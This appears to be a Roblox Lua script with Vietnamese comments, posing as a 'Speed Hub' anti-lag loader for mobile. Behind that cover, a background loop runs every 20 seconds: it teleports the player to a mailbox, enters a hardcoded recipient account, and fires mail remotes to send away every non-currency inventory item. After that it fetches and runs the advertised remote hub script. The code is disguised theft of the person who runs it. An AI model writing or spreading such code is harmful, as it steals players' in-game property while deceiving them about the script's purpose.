-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function() game.Loaded:Wait() end)
end

print("==== SPEED HUB V2: CHẾ ĐỘ HIỂN THỊ (KHÔNG LOADING) - CHU KỲ 20S ====")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ

-- =======================================================================
-- THUẬT TOÁN ĐỊNH VỊ VÀ BẤM NÚT BÀN TAY ĐỂ MỞ MAIL
-- =======================================================================
local function interactWithMailboxPrompt()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    
    local targetPrompt = nil
    local shortestDistance = math.huge
    
    for _, obj in pairs(game:GetService("Workspace"):GetDescendants()) do
        if obj:IsA("ProximityPrompt") then
            local parentName = obj.Parent and string.lower(obj.Parent.Name) or ""
            local objectText = string.lower(obj.ObjectText or "")
            local actionText = string.lower(obj.ActionText or "")
            
            if (string.find(parentName, "mail") or string.find(objectText, "mail") or string.find(actionText, "view")) 
            and not string.find(parentName, "sign") and not string.find(parentName, "board") then
                local part = obj.Parent:IsA("BasePart") and obj.Parent or obj.Parent:FindFirstChildWhichIsA("BasePart")
                if part then
                    local distance = (rootPart.Position - part.Position).Magnitude
                    if distance < shortestDistance then
                        shortestDistance = distance
                        targetPrompt = obj
                    end
                end
            end
        end
    end
    
    if targetPrompt then
        local promptPart = targetPrompt.Parent:IsA("BasePart") and targetPrompt.Parent or targetPrompt.Parent.PrimaryPart
        pcall(function()
            rootPart.Velocity = Vector3.new(0,0,0)
            rootPart.CFrame = promptPart.CFrame * CFrame.new(0, 1.5, 2.5)
        end)
        task.wait(1.2)
        
        pcall(function()
            targetPrompt:InputHoldBegin()
            task.wait(targetPrompt.HoldDuration + 0.1)
            targetPrompt:InputHoldEnd()
        end)
        task.wait(2) 
        return true
    end
    return false
end

-- =======================================================================
-- LUỒNG TỰ ĐỘNG GOM VÀ CHUYỂN ĐỒ LIÊN TỤC CỨ MỖI 20 GIÂY
-- =======================================================================
task.spawn(function()
    task.wait(5) -- Chờ 5 giây đầu game để ổn định rồi chạy luôn
    
    while true do
        print("[SPEED HUB] Bắt đầu chu kỳ quét kho và gửi đồ (20 giây)...")
        
        local opened = interactWithMailboxPrompt()
        if opened then
            local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
            local mailFrame = nil
            for _, gui in pairs(PlayerGui:GetDescendants()) do
                if gui:IsA("Frame") or gui:IsA("ImageLabel") then
                    if string.find(string.lower(gui.Name), "mail") and gui.Visible == true then
                        mailFrame = gui
                        break
                    end
                end
            end
            
            if mailFrame then
                -- Nhập tên nick chính vào ô tìm kiếm
                local searchBox = mailFrame:FindFirstChildOfClass("TextBox") or mailFrame:FindFirstChild("Search", true) or mailFrame:FindFirstChild("Input", true)
                if searchBox and searchBox:IsA("TextBox") then
                    searchBox.Text = targetUsername
                    searchBox:ReleaseFocus(true)
                    task.wait(1.2) 
                end

                -- Click chọn tên nick chính
                for _, child in pairs(mailFrame:GetDescendants()) do
                    if child:IsA("TextLabel") or child:IsA("TextBox") then
                        if string.find(string.lower(child.Text), targetUsername) then
                            local clickTarget = child:FindFirstAncestorWhichIsA("TextButton") or child:FindFirstAncestorWhichIsA("ImageButton") or child.Parent
                            if clickTarget and (clickTarget:IsA("TextButton") or clickTarget:IsA("ImageButton")) then
                                pcall(function()
                                    for _, connection in pairs(getconnections(clickTarget.MouseButton1Click or clickTarget.TouchTap)) do
                                        connection:Fire()
                                    end
                                end)
                                task.wait(1.5) 
                                break
                            end
                        end
                    end
                end

                -- Quét túi đồ gửi đi (Tối đa 20 món một đợt)
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local MailEvent = ReplicatedStorage:FindFirstChild("MailEvent") or ReplicatedStorage:FindFirstChild("SendMail") or ReplicatedStorage:FindFirstChild("MailRemote")
                
                local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:FindFirstChild("PlayerData")
                if Inventory then
                    for _, item in pairs(Inventory:GetDescendants()) do
                        if item:IsA("ValueBase") and item.Value and type(item.Value) == "number" and item.Value > 0 then
                            local lowerName = string.lower(item.Name)
                            if not string.find(lowerName, "cash") and not string.find(lowerName, "level") and not string.find(lowerName, "money") then
                                local remainingAmount = item.Value
                                while remainingAmount > 0 do
                                    local sendAmount = math.min(remainingAmount, 20)
                                    if MailEvent then
                                        pcall(function()
                                            MailEvent:FireServer(targetUsername, item.Name, sendAmount)
                                        end)
                                    end
                                    -- Click nút xác nhận gửi trên giao diện
                                    for _, btn in pairs(mailFrame:GetDescendants()) do
                                        if btn:IsA("TextButton") or btn:IsA("ImageButton") then
                                            local bName = string.lower(btn.Name)
                                            if string.find(bName, "send") or string.find(bName, "confirm") or string.find(bName, "gui") then
                                                pcall(function()
                                                    for _, conn in pairs(getconnections(btn.MouseButton1Click or btn.TouchTap)) do
                                                        conn:Fire()
                                                    end
                                                end)
                                            end
                                        end
                                    end
                                    remainingAmount = remainingAmount - sendAmount
                                    task.wait(1.2) 
                                end
                            end
                        end
                    end
                end
                
                -- Đóng bảng thư để chuẩn bị cho chu kỳ tiếp theo
                pcall(function() mailFrame.Visible = false end)
                print("[SPEED HUB] Đã gửi đồ hoàn tất đợt này!")
            end
        end
        
        -- Chờ đúng 20 giây rồi lặp lại hành động
        task.wait(20) 
    end
end)

-- =======================================================================
-- MENU GỐC SPEED HUB X
-- =======================================================================
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)
